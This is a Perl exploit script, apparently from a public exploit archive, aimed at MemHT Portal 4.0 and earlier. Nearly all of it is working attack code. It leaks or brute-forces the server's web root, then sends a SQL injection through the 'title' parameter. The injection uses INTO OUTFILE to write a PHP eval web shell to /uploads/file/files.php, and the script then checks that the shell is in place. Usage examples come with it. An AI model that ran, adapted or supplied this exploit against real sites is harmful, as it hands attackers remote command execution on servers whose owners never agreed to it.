#!/usr/bin/perl

=about

 MemHT Portal <= 4.0 Perl exploit

    AUTHOR:
    Discovered and written by Ams
    ax330d [doggy] gmail [dot] com

    DESCRIPTION:
    Here we are able to make SQL-injection due to weak filtering.
    So, look at inc/inc_header.php lines ~ 74, where hides code
    $checktitle = (isset($_GET['title'])) ? urldecode(inCode($_GET['title'])) : "" ;
We can easily bypass this check. And look again at lines
    ~ 67 in inc/inc_fnctions.php, - this is not that best solution.
    
    This exploit provides simple shell.

    REQUIREMENTS:
    MySQL should be able to write to file
    Know full server path to portal
    
=cut

    use strict;
use warnings;
use IO::Socket;

print "
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  MemHT portal <= 4.0 Perl exploit
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
";

my $expl_url  = shift or &usage;
my $serv_path = shift || '-b';
my $def_shell = '/uploads/file/files.php';
# Simple concept shell
my $shell = '%253C%253Fphp%2520@eval%2528%2524_GET%255Bcmd%255D%2529%253B';

my @paths = qw(
	       /var/www/htdocs /var/www/localhost/htdocs /var/www /var/wwww/hosting /var/www/html /var/www/vhosts
	       /home/www  /home/httpd/vhosts
	       /usr/local/apache/htdocs
	       /www/htdocs
	       );

@paths = ( $serv_path ) unless $serv_path eq '-b';

exploit( $expl_url );

sub exploit {
    
    #Defining vars.
    $_ = shift;
    $_ .= '/' unless substr($_, -1) eq '/';
    print "\n\tExploiting:\t $_\n";
    
    my($packet, $rcvd);
    my($prot, $host, $path, ) = m{(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?};
				       
				       #Trying to get /lang/english.php to get server path
				       $packet  = "POST $path/lang/english.php HTTP/1.1\r\n";
				       $packet .= "Host: $host\r\n";
				       $packet .= "Connection: Close\r\n";
				       $packet .= "Content-Type: application/x-www-form-urlencoded\r\n\r\n";
				       $rcvd = send_pckt($host, $packet, 1);
				       
				       die "\n\tUnable to connect to $host!\n\n" unless $rcvd;
				       
				       if( $rcvd =~ /Undefined variable:/ ) {
					   @paths = ($rcvd =~ m#\s+in\s+(.*?)${path}lang/english.php#);
						     print "\n\tFound path:\t $paths[-1]\n";
						 } else {
						     print "\n\tStarting bruteforce...\n";
						 }
					   
					   #Some bruteforce here
					   for $serv_path ( @paths ) {
					       
					       #Poisoned request
					       my $injection
						   = "page=articles&id=-1&op=readArticle&title=one%2527%2520UNION+SELECT+1%2C2%2C%2527$shell%2527+INTO+OUTFILE+%2527$serv_path$path$def_shell%2527--\%2520";
					       
					       print "\n\tTesting:\t $serv_path$path$def_shell ...\n";
					       $packet  = "GET $path/index.php?$injection HTTP/1.1\r\n";
					       $packet .= "Host: $host\r\n";
					       $packet .= "Connection: Close\r\n";
					       $packet .= "Content-Type: application/x-www-form-urlencoded\r\n\r\n";
					       
					       send_pckt($host, $packet, 1) or die "\n\tUnable to connect to http://$host!\n\n";
					   }

					   #Checking for shell presence
					   $packet  = "HEAD $path$def_shell HTTP/1.1\r\n";
					   $packet .= "Host: $host\r\n";
					   $packet .= "Connection: Close\r\n";
					   $packet .= "Content-Type: application/x-www-form-urlencoded\r\n\r\n";
					   
					   $rcvd = send_pckt($host, $packet, 1);
					   if( ! $rcvd) {
					       print "\n\tUnable to connect to $host\n\n";
					       exit;
					   }

					   if( $rcvd =~ /200\s+OK/ ) {
					       print "\n\tExploited:\t http://$host$path$def_shell\n\n";
					   } else {
					       print "\n\tExploiting failed.\n\n";
					   }
					   
				       }

sub send_pckt() {
    
    my $dat;
    my ($host, $packet, $ret) = @_;
    my $socket = IO::Socket::INET->new(
				       Proto    => 'tcp',
				       PeerAddr => $host,
				       PeerPort => 80
				       );
    if( ! $socket) {
	return 0;
    } else {
	
	print $socket $packet;
	if( $ret ) {
	    local $/;
	    $dat = <$socket>;
	}
	close $socket;
	return $dat;
    }
}

sub usage {
    print "\n\tUsage:\t$0 http://site.com [-b|full server path]

By default exlpoit checks /lang/english.php for errors to get real path.
If path could not be found exploit will bruteforce it ( or if used -b or none path is specified ).

Example:\t$0 http://localhost/ /var/www/htdocs
$0 http://localhost/ -b
$0 http://localhost/\n\n";
    exit;
}

